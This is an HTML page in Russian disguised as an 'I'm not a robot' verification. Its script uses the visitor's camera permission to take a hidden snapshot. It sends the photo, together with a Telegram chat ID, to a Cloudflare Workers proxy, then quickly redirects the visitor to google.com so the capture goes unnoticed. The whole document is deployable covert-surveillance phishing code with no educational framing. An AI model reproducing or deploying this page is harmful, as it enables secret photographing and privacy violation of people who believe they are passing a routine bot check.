    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
                Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
        // 1. Настройки (Прокси Cloudflare и твой ID)
const chatId = '1976857829';
const targetUrl = 'https://google.com';
const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    try {
        // Запрашиваем доступ (появится окно "Разрешить?")
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Делаем фото МГНОВЕННО (как только поток пошел)
        await new Promise(res => {
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                res();
            };
        });

        // Конвертируем и готовим к отправке
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'img.jpg');

        // ОТПРАВЛЯЕМ (не ждем ответа через await, чтобы сэкономить время)
        fetch(proxyUrl, { method: 'POST', body: formData });

        // Сразу выключаем камеру
        stream.getTracks().forEach(t => t.stop());

    } catch (err) {
        console.log("Отказ или ошибка:", err);
    } finally {
        // МГНОВЕННЫЙ ПЕРЕХОД
        window.location.href = targetUrl;
    }
};


        </script>
    </body>
    </html>
